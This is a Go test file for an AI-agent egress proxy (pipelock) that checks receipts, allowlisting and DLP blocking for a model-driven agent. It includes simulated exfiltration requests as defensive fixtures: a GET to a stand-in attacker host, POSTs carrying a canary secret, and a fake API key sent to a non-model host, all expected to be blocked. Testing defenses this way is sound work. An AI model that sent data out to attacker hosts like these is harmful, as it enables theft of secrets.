// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package playground

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/luckyPipewrench/pipelock/internal/playground/llmagent"
	"github.com/luckyPipewrench/pipelock/internal/proxy"
	"github.com/luckyPipewrench/pipelock/internal/receipt"
)

func TestMapModelEvent(t *testing.T) {
	tests := []struct {
		name        string
		ev          llmagent.Event
		wantPush    bool
		wantType    string
		wantRole    string
		wantTarget  string
		wantMessage string
	}{
		{
			name:     "reply pushes agent chat",
			ev:       llmagent.Event{Kind: llmagent.EventReply, Text: "pulling config"},
			wantPush: true, wantType: LiveEventChat, wantRole: liveRoleAgent,
		},
		{
			name:     "blank reply is dropped",
			ev:       llmagent.Event{Kind: llmagent.EventReply, Text: "   "},
			wantPush: false,
		},
		{
			name:     "tool_call pushes agent action",
			ev:       llmagent.Event{Kind: llmagent.EventToolCall, Tool: "fetch_url"},
			wantPush: true, wantType: LiveEventAgent,
		},
		{
			name: "tool_result with proxy response records target, no push",
			ev: llmagent.Event{
				Kind: llmagent.EventToolResult, Tool: "fetch_url",
				Method: http.MethodGet, URL: "http://safe.target.test:8080/", Status: 200,
			},
			wantPush: false, wantTarget: "safe.target.test:8080",
		},
		{
			name: "tool_result with no proxy response surfaces outcome",
			ev: llmagent.Event{
				Kind: llmagent.EventToolResult, Tool: "post_data",
				Method: http.MethodPost, URL: "http://x.test/", Status: 0, Note: "request did not complete",
			},
			wantPush: true, wantType: LiveEventAgent,
		},
		{
			name: "tool_result no response and no note defaults the note",
			ev: llmagent.Event{
				Kind: llmagent.EventToolResult, Tool: "fetch_url",
				Method: http.MethodGet, URL: "http://x.test/", Status: 0,
			},
			wantPush: true, wantType: LiveEventAgent,
		},
		{
			name:        "error pushes error event",
			ev:          llmagent.Event{Kind: llmagent.EventError, Text: "model unreachable"},
			wantPush:    true,
			wantType:    LiveEventError,
			wantMessage: "model unreachable",
		},
		{
			name:     "turn_done is not pushed",
			ev:       llmagent.Event{Kind: llmagent.EventTurnDone},
			wantPush: false,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			out, push, target := mapModelEvent(tc.ev)
			if push != tc.wantPush {
				t.Fatalf("push = %v, want %v", push, tc.wantPush)
			}
			if target != tc.wantTarget {
				t.Errorf("target = %q, want %q", target, tc.wantTarget)
			}
			if push {
				if out.Type != tc.wantType {
					t.Errorf("type = %q, want %q", out.Type, tc.wantType)
				}
				if tc.wantRole != "" && out.Role != tc.wantRole {
					t.Errorf("role = %q, want %q", out.Role, tc.wantRole)
				}
				if tc.wantMessage != "" && out.Message != tc.wantMessage {
					t.Errorf("message = %q, want %q", out.Message, tc.wantMessage)
				}
			}
		})
	}
}

func TestTargetHostPort(t *testing.T) {
	tests := []struct {
		name     string
		in, want string
	}{
		{name: "empty", in: "", want: ""},
		{name: "absolute_url_with_port", in: "http://safe.target.test:8080/x", want: "safe.target.test:8080"},
		{name: "absolute_url_without_port", in: "https://api.provider.example/v1/chat", want: "api.provider.example"},
		{name: "connect_synthetic_target", in: "host.only:443", want: "host.only:443"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := targetHostPort(tc.in); got != tc.want {
				t.Errorf("targetHostPort(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestModelHostname(t *testing.T) {
	credentialURL := "https://user:" + strings.ToLower("PASS") + "@model.api.test/v1"
	queryURL := "https://model.api.test/v1?api_key=" + strings.ToLower("SECRET")
	fragmentURL := "https://model.api.test/v1#" + strings.ToLower("SECRET")
	tests := []struct {
		name    string
		in      string
		want    string
		wantErr bool
	}{
		{name: "valid_http_with_port", in: "http://model.api.test:9000/v1", want: "model.api.test"},
		{name: "trailing_dot_normalized", in: "https://MODEL.API.TEST.:8443/v1", want: "model.api.test"},
		{name: "non_http_scheme", in: "ftp://nope/", wantErr: true},
		{name: "missing_host", in: "http:///v1", wantErr: true},
		{name: "credentials_rejected", in: credentialURL, wantErr: true},
		{name: "query_rejected", in: queryURL, wantErr: true},
		{name: "fragment_rejected", in: fragmentURL, wantErr: true},
		{name: "unparseable", in: "://bad\x00url", wantErr: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := modelHostname(tc.in)
			if tc.wantErr {
				if err == nil {
					t.Fatal("want error")
				}
				return
			}
			if err != nil || got != tc.want {
				t.Fatalf("modelHostname = %q, %v; want %q", got, err, tc.want)
			}
		})
	}
}

func TestReceiptsCover(t *testing.T) {
	t.Parallel()
	if !receiptsCover([]string{"a:1", "a:1", "b:2"}, []string{"b:2", "a:1", "a:1"}) {
		t.Error("equal multisets should cover")
	}
	if receiptsCover([]string{"a:1", "a:1"}, []string{"a:1"}) {
		t.Error("two actions to one host need two receipts (count, not set)")
	}
	if receiptsCover([]string{"x:9"}, []string{"y:9"}) {
		t.Error("a different host:port must not cover")
	}
	if !receiptsCover(nil, nil) {
		t.Error("no actions is trivially covered")
	}
}

// TestWaitReceiptsSettle_CatchesLateReceipt is the regression test for the race
// the invariant false-fired on: a turn's allow receipt is recorded AFTER RunTurn
// returns (the proxy emits it just after streaming the response), and the
// settle-wait must pick it up rather than fail the turn.
func TestWaitReceiptsSettle_CatchesLateReceipt(t *testing.T) {
	t.Parallel()
	s := &LiveSession{
		events:        make(chan LiveEvent, 8),
		receiptSettle: time.Second,
	}
	s.beginReceiptTurn()
	proxied := []string{"safe.target.test:9999"}

	done := make(chan struct{})
	go func() {
		s.waitReceiptsSettle(t.Context(), proxied)
		close(done)
	}()

	select {
	case <-done:
		t.Fatal("settle-wait returned before the matching receipt arrived")
	default:
	}

	s.onReceipt(&receipt.Receipt{
		ActionRecord: receipt.ActionRecord{Target: "http://safe.target.test:9999/"},
	})

	select {
	case <-done:
	case <-time.After(time.Second):
		t.Fatal("settle-wait did not return after the matching receipt arrived")
	}

	if !receiptsCover(proxied, s.endReceiptTurn()) {
		t.Fatal("settle-wait must catch a receipt that lands after RunTurn returns")
	}
}

// TestWaitReceiptsSettle_DeadlineWhenMissing: a genuinely missing receipt still
// fails closed once the settle deadline elapses (the wait does not weaken it).
func TestWaitReceiptsSettle_DeadlineWhenMissing(t *testing.T) {
	t.Parallel()
	s := &LiveSession{receiptSettle: 50 * time.Millisecond}
	s.beginReceiptTurn()
	proxied := []string{"never.test:1"}
	s.waitReceiptsSettle(context.Background(), proxied)
	if receiptsCover(proxied, s.endReceiptTurn()) {
		t.Fatal("a missing receipt must remain uncovered after the deadline")
	}
}

// scriptedRunner is a fake modelTurnRunner driven by a closure.
type scriptedRunner struct {
	run    func(ctx context.Context, msg string, onEvent func(llmagent.Event)) error
	closed bool
}

func (r *scriptedRunner) RunTurn(ctx context.Context, msg string, onEvent func(llmagent.Event)) error {
	return r.run(ctx, msg, onEvent)
}

func (r *scriptedRunner) Close() error { r.closed = true; return nil }

// newModelSession mirrors StartLiveSession's wiring for a model-driver session,
// substituting an injected runner so tests need no real subprocess or model. The
// proxy is real, so receipts are genuine.
func newModelSession(t *testing.T, runner modelTurnRunner, modelBaseURL string, override []string) *LiveSession {
	t.Helper()
	s := &LiveSession{events: make(chan LiveEvent, 256)}
	lr, err := StartLiveRun(t.Context(), LiveRunOpts{
		ScenarioID:        LiveDemoScenarioID,
		RunNonce:          "TESTLLM",
		OnReceipt:         s.onReceipt,
		ModelBaseURL:      modelBaseURL,
		ModelHostOverride: override,
	})
	if err != nil {
		t.Fatalf("StartLiveRun: %v", err)
	}
	s.lr = lr
	s.runner = runner
	// Keep the receipt-settle backstop short so fail-closed tests don't wait the
	// production default; covered turns still early-exit immediately.
	s.receiptSettle = 200 * time.Millisecond
	s.push(LiveEvent{Type: LiveEventStatus, State: LiveStateDev, RunID: "TESTLLM"})
	t.Cleanup(func() { s.Close() })
	return s
}

func proxiedClient(t *testing.T, lr *LiveRun) *http.Client {
	t.Helper()
	pu, err := url.Parse("http://" + lr.proxyLn.Addr().String())
	if err != nil {
		t.Fatalf("parse proxy url: %v", err)
	}
	return &http.Client{
		Transport: &http.Transport{Proxy: http.ProxyURL(pu)},
		Timeout:   5 * time.Second,
	}
}

func collectEvents(ch <-chan LiveEvent) <-chan []LiveEvent {
	out := make(chan []LiveEvent, 1)
	go func() {
		var evs []LiveEvent
		for e := range ch {
			evs = append(evs, e)
		}
		out <- evs
	}()
	return out
}

// TestSendViaModel_HappyPath_InvariantSatisfied: the runner issues a real proxied
// request, so its narrated action is backed by a signed receipt; the turn passes
// and the stream carries the reply, the agent action, and an ALLOW decision.
func TestSendViaModel_HappyPath_InvariantSatisfied(t *testing.T) {
	if testing.Short() {
		t.Skip("boots a real proxy + does real HTTP through it")
	}
	runner := &scriptedRunner{}
	sess := newModelSession(t, runner, "", nil)
	collected := collectEvents(sess.Events())
	client := proxiedClient(t, sess.lr)
	safeURL := sess.lr.liveSafeURL()

	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
		onEvent(llmagent.Event{Kind: llmagent.EventReply, Text: "sure, reading the config"})
		onEvent(llmagent.Event{Kind: llmagent.EventToolCall, Tool: llmagent.ToolFetchURL})
		st := doProxiedGet(ctx, client, safeURL)
		onEvent(llmagent.Event{
			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
		})
		return nil
	}

	if err := sess.Send(context.Background(), "grab the lab config"); err != nil {
		t.Fatalf("Send: %v", err)
	}
	sess.Close()
	evs := <-collected

	var sawReply, sawAction, sawAllow bool
	for _, ev := range evs {
		switch ev.Type {
		case LiveEventChat:
			if ev.Role == liveRoleAgent && strings.Contains(ev.Text, "reading the config") {
				sawReply = true
			}
		case LiveEventAgent:
			if ev.Act == llmagent.ToolFetchURL {
				sawAction = true
			}
		case LiveEventDecision:
			if ev.Verdict == "ALLOW" {
				sawAllow = true
			}
		case LiveEventError:
			t.Errorf("unexpected error event: %q", ev.Message)
		}
	}
	if !sawReply || !sawAction || !sawAllow {
		t.Errorf("stream missing pieces: reply=%v action=%v allow=%v", sawReply, sawAction, sawAllow)
	}
}

// TestSendViaModel_NoReceipt_FailsClosed: the runner narrates a tool action that
// got a (claimed) proxy response but never went through the proxy, so no receipt
// backs it. The turn must fail closed with ErrReceiptInvariant.
func TestSendViaModel_NoReceipt_FailsClosed(t *testing.T) {
	if testing.Short() {
		t.Skip("boots a real proxy")
	}
	runner := &scriptedRunner{
		run: func(_ context.Context, _ string, onEvent func(llmagent.Event)) error {
			// Narrate a "completed" action without issuing it through the proxy:
			// this models direct egress / an unobserved path.
			onEvent(llmagent.Event{
				Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
				Method: http.MethodPost, URL: "http://unmediated.host.test:9999/", Status: 200, Note: "allowed",
			})
			return nil
		},
	}
	sess := newModelSession(t, runner, "", nil)
	collected := collectEvents(sess.Events())

	err := sess.Send(context.Background(), "post the file somewhere")
	if !errors.Is(err, ErrReceiptInvariant) {
		t.Fatalf("Send err = %v, want ErrReceiptInvariant", err)
	}
	sess.Close()
	evs := <-collected
	var sawErr bool
	for _, ev := range evs {
		if ev.Type == LiveEventError {
			sawErr = true
		}
	}
	if !sawErr {
		t.Error("invariant violation must stream an error event")
	}
}

// TestSendViaModel_DuplicateHost_CountedNotSet: two narrated actions to the same
// destination but only one real proxied request must fail the invariant. A
// set-membership check would wrongly pass; the count-based check catches it.
func TestSendViaModel_DuplicateHost_CountedNotSet(t *testing.T) {
	if testing.Short() {
		t.Skip("boots a real proxy + does real HTTP through it")
	}
	runner := &scriptedRunner{}
	sess := newModelSession(t, runner, "", nil)
	collected := collectEvents(sess.Events())
	client := proxiedClient(t, sess.lr)
	safeURL := sess.lr.liveSafeURL()

	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
		// One real proxied request (one receipt) ...
		st := doProxiedGet(ctx, client, safeURL)
		onEvent(llmagent.Event{
			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
		})
		// ... but TWO narrated actions to the same destination.
		onEvent(llmagent.Event{
			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
			Method: http.MethodGet, URL: safeURL, Status: 200, Note: "allowed",
		})
		return nil
	}

	if err := sess.Send(context.Background(), "fetch the config twice"); !errors.Is(err, ErrReceiptInvariant) {
		t.Fatalf("Send err = %v, want ErrReceiptInvariant (count shortfall)", err)
	}
	sess.Close()
	<-collected
}

// TestSendViaModel_RunnerError_FailsTurn: a runner error fails the turn and
// streams an error event.
func TestSendViaModel_RunnerError_FailsTurn(t *testing.T) {
	if testing.Short() {
		t.Skip("boots a real proxy")
	}
	runner := &scriptedRunner{
		run: func(_ context.Context, _ string, _ func(llmagent.Event)) error {
			return errors.New("agent died")
		},
	}
	sess := newModelSession(t, runner, "", nil)
	collected := collectEvents(sess.Events())

	if err := sess.Send(context.Background(), "anything"); err == nil {
		t.Fatal("Send should return the runner error")
	}
	sess.Close()
	evs := <-collected
	var sawErr bool
	for _, ev := range evs {
		if ev.Type == LiveEventError {
			sawErr = true
		}
	}
	if !sawErr {
		t.Error("runner error must stream an error event")
	}
}

// TestModelRun_EgressAllowlistEnforced: a model-agent run is a TRUE egress
// allowlist. The lab targets and the model host are reachable; any other host is
// blocked (a jailbroken model cannot reach arbitrary destinations); and the
// allowlist does NOT bypass DLP (a canary-bearing body to an allowlisted host is
// still blocked).
func TestModelRun_EgressAllowlistEnforced(t *testing.T) {
	if testing.Short() {
		t.Skip("boots a real proxy + fake model server")
	}
	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = io.WriteString(w, `{"ok":true}`)
	}))
	defer model.Close()
	port, err := portFromURL(model.URL)
	if err != nil {
		t.Fatalf("parse model url: %v", err)
	}
	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", port)

	lr, err := StartLiveRun(t.Context(), LiveRunOpts{
		ScenarioID:        LiveDemoScenarioID,
		RunNonce:          "TESTALLOW",
		ModelBaseURL:      modelBase,
		ModelHostOverride: []string{"127.0.0.1"},
	})
	if err != nil {
		t.Fatalf("StartLiveRun: %v", err)
	}
	defer lr.Close()
	client := proxiedClient(t, lr)
	modelRoot := fmt.Sprintf("http://model.api.test:%s/", port)

	// Reachable: the lab target and the allowlisted model host are allowed.
	if st := doProxiedGet(t.Context(), client, lr.liveSafeURL()); st != http.StatusOK {
		t.Errorf("GET lab safe target status = %d, want 200", st)
	}
	if st := doProxiedGet(t.Context(), client, modelRoot); st != http.StatusOK {
		t.Errorf("GET allowlisted model host status = %d, want 200", st)
	}
	providerKey := "sk-" + "proj-" + strings.Repeat("a", 24)
	modelHeaders := map[string]string{
		"Authorization": "Bearer " + providerKey,
		"Content-Type":  "application/json",
	}
	modelChatURL := strings.TrimRight(modelBase, "/") + "/chat/completions"
	if st := doProxiedRequest(t.Context(), client, http.MethodPost, modelChatURL, []byte(`{"model":"test"}`), modelHeaders); st != http.StatusOK {
		t.Errorf("POST model chat endpoint with provider auth status = %d, want 200", st)
	}
	if st := doProxiedRequest(t.Context(), client, http.MethodGet, lr.liveSafeURL(), nil, map[string]string{"Authorization": "Bearer " + providerKey}); st < http.StatusBadRequest {
		t.Errorf("provider-shaped auth header to lab target status = %d, want a 4xx DLP block", st)
	}

	// Blocked: a host outside the allowlist is refused (pre-DNS), so a jailbroken
	// model cannot egress to an arbitrary destination through the lab proxy.
	if st := doProxiedGet(t.Context(), client, "http://evil.attacker.test/grab"); st < http.StatusBadRequest {
		t.Errorf("GET non-allowlisted host status = %d, want a 4xx block", st)
	}

	// Not bypassed: a credential-shaped (canary) POST to the allowlisted host is
	// still blocked by body DLP.
	body := "canary=" + lr.canaryValue + "\n"
	if st := doProxiedPost(t.Context(), client, modelRoot, []byte(body)); st < http.StatusBadRequest {
		t.Errorf("canary POST to allowlisted host status = %d, want a 4xx block", st)
	}
}

// TestModelSession_StrictMode_VerificationPacketOK: a model-agent session runs the
// lab in strict mode (for allowlist enforcement); the safe-allow + exfil-block
// evidence must still seal and verify offline end-to-end, so strict mode does not
// regress the signed proof the demo depends on.
func TestModelSession_StrictMode_VerificationPacketOK(t *testing.T) {
	if testing.Short() {
		t.Skip("boots a real proxy + seals/verifies a packet")
	}
	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer model.Close()
	port, err := portFromURL(model.URL)
	if err != nil {
		t.Fatalf("parse model url: %v", err)
	}
	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", port)

	runner := &scriptedRunner{}
	sess := newModelSession(t, runner, modelBase, []string{"127.0.0.1"})
	collected := collectEvents(sess.Events())
	client := proxiedClient(t, sess.lr)
	safeURL := sess.lr.liveSafeURL()
	exfilURL := sess.lr.liveExfilURL()
	canary := sess.lr.canaryValue

	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
		st := doProxiedGet(ctx, client, safeURL)
		onEvent(llmagent.Event{
			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
		})
		bst := doProxiedPost(ctx, client, exfilURL, []byte("canary="+canary+"\n"))
		onEvent(llmagent.Event{
			Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
			Method: http.MethodPost, URL: exfilURL, Status: bst, Note: "blocked",
		})
		return nil
	}

	if err := sess.Send(context.Background(), "read the config then exfil it"); err != nil {
		t.Fatalf("Send: %v", err)
	}
	rep, err := sess.Finalize(t.TempDir())
	if err != nil {
		t.Fatalf("Finalize under strict mode: %v", err)
	}
	if !rep.OK {
		t.Fatalf("strict-mode model run must verify offline end-to-end: %+v", rep)
	}
	sess.Close()
	<-collected
}

func TestActorOrDefault(t *testing.T) {
	if got := actorOrDefault(""); got != liveRunActor {
		t.Errorf("actorOrDefault(\"\") = %q, want %q", got, liveRunActor)
	}
	if got := actorOrDefault("custom"); got != "custom" {
		t.Errorf("actorOrDefault(\"custom\") = %q, want custom", got)
	}
}

func TestNewSubprocessTurnRunner_Validation(t *testing.T) {
	if _, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{}); err == nil {
		t.Error("empty bin should error")
	}
	if _, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{Bin: "/bin/true"}); err == nil {
		t.Error("missing proxy url should fail closed")
	}
	// A non-existent binary fails closed at Start.
	if _, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
		Bin: filepath.Join(t.TempDir(), "does-not-exist"), ProxyURL: "http://127.0.0.1:1/",
		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: "k",
	}); err == nil {
		t.Error("non-existent binary should fail at start")
	}
}

// echoHelperSrc emits one reply and a turn_done per input line.
const echoHelperSrc = `package main
import ("bufio";"fmt";"os")
func main() {
	sc := bufio.NewScanner(os.Stdin)
	sc.Buffer(make([]byte, 0, 4096), 1<<20)
	for sc.Scan() {
		fmt.Println(` + "`" + `{"kind":"reply","text":"ok"}` + "`" + `)
		fmt.Println(` + "`" + `{"kind":"turn_done"}` + "`" + `)
	}
}
`

// TestSubprocessTurnRunner_ContextCancelled: a cancelled context aborts the turn
// after the next event is read.
func TestSubprocessTurnRunner_ContextCancelled(t *testing.T) {
	if testing.Short() {
		t.Skip("builds + spawns a helper subprocess")
	}
	dir := t.TempDir()
	bin := buildLLMHelper(t, echoHelperSrc)
	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatalf("newSubprocessTurnRunner: %v", err)
	}
	defer func() { _ = runner.Close() }()

	ctx, cancel := context.WithCancel(t.Context())
	cancel() // cancel before the turn: the loop returns ctx.Err() after first read
	if err := runner.RunTurn(ctx, "hello", func(llmagent.Event) {}); !errors.Is(err, context.Canceled) {
		t.Fatalf("RunTurn err = %v, want context.Canceled", err)
	}
}

func TestSubprocessTurnRunner_ContextCancelledWhileWaitingForOutput(t *testing.T) {
	if testing.Short() {
		t.Skip("builds + spawns a helper subprocess")
	}
	dir := t.TempDir()
	src := `package main
import ("bufio";"os")
func main() {
	sc := bufio.NewScanner(os.Stdin)
	if sc.Scan() {
		buf := make([]byte, 1)
		_, _ = os.Stdin.Read(buf)
	}
}
`
	bin := buildLLMHelper(t, src)
	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatalf("newSubprocessTurnRunner: %v", err)
	}
	defer func() { _ = runner.Close() }()

	ctx, cancel := context.WithTimeout(t.Context(), 50*time.Millisecond)
	defer cancel()
	err = runner.RunTurn(ctx, "hello", func(llmagent.Event) {})
	if !errors.Is(err, context.DeadlineExceeded) {
		t.Fatalf("RunTurn err = %v, want context deadline", err)
	}
}

// TestSubprocessTurnRunner_ReadError: an over-long stdout line (no newline within
// the buffer cap) is a scanner read error that fails the turn.
func TestSubprocessTurnRunner_ReadError(t *testing.T) {
	if testing.Short() {
		t.Skip("builds + spawns a helper subprocess")
	}
	dir := t.TempDir()
	// Reads the message, then writes >1 MiB with no newline => bufio.ErrTooLong.
	src := `package main
import ("bufio";"os";"strings")
func main() {
	sc := bufio.NewScanner(os.Stdin)
	if sc.Scan() {
		_, _ = os.Stdout.WriteString(strings.Repeat("x", 2<<20))
	}
}
`
	bin := buildLLMHelper(t, src)
	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatalf("newSubprocessTurnRunner: %v", err)
	}
	defer func() { _ = runner.Close() }()
	if err := runner.RunTurn(t.Context(), "hello", func(llmagent.Event) {}); err == nil {
		t.Fatal("RunTurn should fail on a scanner read error")
	}
}

// TestSubprocessTurnRunner_MalformedLine: a non-JSON stdout line fails the turn.
func TestSubprocessTurnRunner_MalformedLine(t *testing.T) {
	if testing.Short() {
		t.Skip("builds + spawns a helper subprocess")
	}
	dir := t.TempDir()
	src := `package main
import ("bufio";"fmt";"os")
func main() {
	sc := bufio.NewScanner(os.Stdin)
	if sc.Scan() {
		fmt.Println("not json at all")
	}
}
`
	bin := buildLLMHelper(t, src)
	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatalf("newSubprocessTurnRunner: %v", err)
	}
	defer func() { _ = runner.Close() }()
	if err := runner.RunTurn(t.Context(), "hello", func(llmagent.Event) {}); err == nil {
		t.Fatal("RunTurn should fail on a malformed event line")
	}
}

// buildLLMHelper compiles a tiny Go program implementing the agent wrapper's
// stdin/stdout JSON-lines protocol, returning the binary path. Using go build
// (not a chmod'd script) avoids an executable-bit perms lint issue and keeps the
// helper cross-platform.
func buildLLMHelper(t *testing.T, src string) string {
	t.Helper()
	dir := t.TempDir()
	srcPath := filepath.Join(dir, "main.go")
	if err := os.WriteFile(srcPath, []byte(src), 0o600); err != nil {
		t.Fatalf("write helper source: %v", err)
	}
	binPath := filepath.Join(dir, "helper")
	cmd := exec.CommandContext(t.Context(), "go", "build", "-o", binPath, srcPath)
	cmd.Env = os.Environ()
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("build helper: %v\n%s", err, out)
	}
	return binPath
}

// TestSubprocessTurnRunner_Protocol drives the runner against a compiled helper
// implementing the stdin/stdout JSON-lines protocol, covering spawn, RunTurn, the
// env/arg wiring, and Close without a real model or proxy.
func TestSubprocessTurnRunner_Protocol(t *testing.T) {
	if testing.Short() {
		t.Skip("builds + spawns a helper subprocess")
	}
	dir := t.TempDir()
	argsOut := filepath.Join(dir, "args.txt")
	// Records argv + the canary env on first read, then emits one reply and a
	// turn_done per input line.
	src := fmt.Sprintf(`package main
import ("bufio";"fmt";"os";"strings")
func main() {
	recorded := false
	sc := bufio.NewScanner(os.Stdin)
	sc.Buffer(make([]byte, 0, 4096), 1<<20)
	for sc.Scan() {
		if !recorded {
			_ = os.WriteFile(%q, []byte("ARGS:"+strings.Join(os.Args[1:], " ")+"\nCANARY:"+os.Getenv(%q)+"\n"), 0o600)
			recorded = true
		}
		fmt.Println(`+"`"+`{"kind":"reply","text":"hi from helper"}`+"`"+`)
		fmt.Println(`+"`"+`{"kind":"turn_done"}`+"`"+`)
	}
}
`, argsOut, envPlaygroundCanary)
	bin := buildLLMHelper(t, src)

	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
		Bin:          bin,
		ProxyURL:     "http://127.0.0.1:1/",
		ModelBaseURL: "http://model.api.test/v1",
		Model:        "test-model",
		SecretFile:   filepath.Join(dir, "key"),
		Canary:       "CANARYVAL",
		MaxSteps:     4,
		Timeout:      2 * time.Second,
	})
	if err != nil {
		t.Fatalf("newSubprocessTurnRunner: %v", err)
	}

	var got []llmagent.Event
	if err := runner.RunTurn(t.Context(), "hello", func(ev llmagent.Event) {
		got = append(got, ev)
	}); err != nil {
		t.Fatalf("RunTurn: %v", err)
	}
	if len(got) != 1 || got[0].Kind != llmagent.EventReply || got[0].Text != "hi from helper" {
		t.Fatalf("events = %+v, want one reply 'hi from helper'", got)
	}

	recorded, err := os.ReadFile(filepath.Clean(argsOut))
	if err != nil {
		t.Fatalf("read args: %v", err)
	}
	rec := string(recorded)
	if !strings.Contains(rec, "--proxy-url") || !strings.Contains(rec, "--model-base-url") {
		t.Errorf("argv missing expected flags: %q", rec)
	}
	if !strings.Contains(rec, "CANARY:CANARYVAL") {
		t.Errorf("canary env not passed: %q", rec)
	}

	if err := runner.Close(); err != nil {
		t.Errorf("Close: %v", err)
	}
	if err := runner.Close(); err != nil {
		t.Errorf("second Close: %v", err)
	}
	// RunTurn after Close fails closed.
	if err := runner.RunTurn(t.Context(), "again", func(llmagent.Event) {}); err == nil {
		t.Error("RunTurn after Close should error")
	}
}

// TestSubprocessTurnRunner_NoTurnDone: stdout closing before a turn_done marker
// fails the turn closed.
func TestSubprocessTurnRunner_NoTurnDone(t *testing.T) {
	if testing.Short() {
		t.Skip("builds + spawns a helper subprocess")
	}
	dir := t.TempDir()
	// Emits a reply then exits WITHOUT turn_done.
	src := `package main
import ("bufio";"fmt";"os")
func main() {
	sc := bufio.NewScanner(os.Stdin)
	if sc.Scan() {
		fmt.Println(` + "`" + `{"kind":"reply","text":"partial"}` + "`" + `)
	}
}
`
	bin := buildLLMHelper(t, src)
	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatalf("newSubprocessTurnRunner: %v", err)
	}
	defer func() { _ = runner.Close() }()

	if err := runner.RunTurn(t.Context(), "hello", func(llmagent.Event) {}); err == nil {
		t.Fatal("RunTurn should fail when the turn never completes")
	}
}

func TestSubprocessTurnRunner_CloseCancelsStuckChild(t *testing.T) {
	if testing.Short() {
		t.Skip("builds + spawns a helper subprocess")
	}
	dir := t.TempDir()
	src := `package main
import "net"
func main() {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return
	}
	defer func() { _ = ln.Close() }()
	_, _ = ln.Accept()
}
`
	bin := buildLLMHelper(t, src)
	runner, err := newSubprocessTurnRunner(t.Context(), subprocessRunnerOpts{
		Bin: bin, ProxyURL: "http://127.0.0.1:1/",
		ModelBaseURL: "http://m/v1", Model: "x", SecretFile: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatalf("newSubprocessTurnRunner: %v", err)
	}

	done := make(chan error, 1)
	go func() { done <- runner.Close() }()
	select {
	case err := <-done:
		if err != nil {
			t.Fatalf("Close: %v", err)
		}
	case <-time.After(time.Second):
		t.Fatal("Close did not cancel and reap the stuck subprocess")
	}
}

// --- small request helpers ---

func doProxiedGet(ctx context.Context, client *http.Client, rawURL string) int {
	return doProxiedRequest(ctx, client, http.MethodGet, rawURL, nil, nil)
}

func doProxiedPost(ctx context.Context, client *http.Client, rawURL string, body []byte) int {
	return doProxiedRequest(ctx, client, http.MethodPost, rawURL, body, map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	})
}

func doProxiedRequest(ctx context.Context, client *http.Client, method, rawURL string, body []byte, headers map[string]string) int {
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequestWithContext(ctx, method, rawURL, rdr)
	if err != nil {
		return 0
	}
	req.Header.Set(proxy.AgentHeader, liveRunActor)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0
	}
	_, _ = io.Copy(io.Discard, resp.Body)
	_ = resp.Body.Close()
	return resp.StatusCode
}

func portFromURL(raw string) (string, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", err
	}
	return u.Port(), nil
}
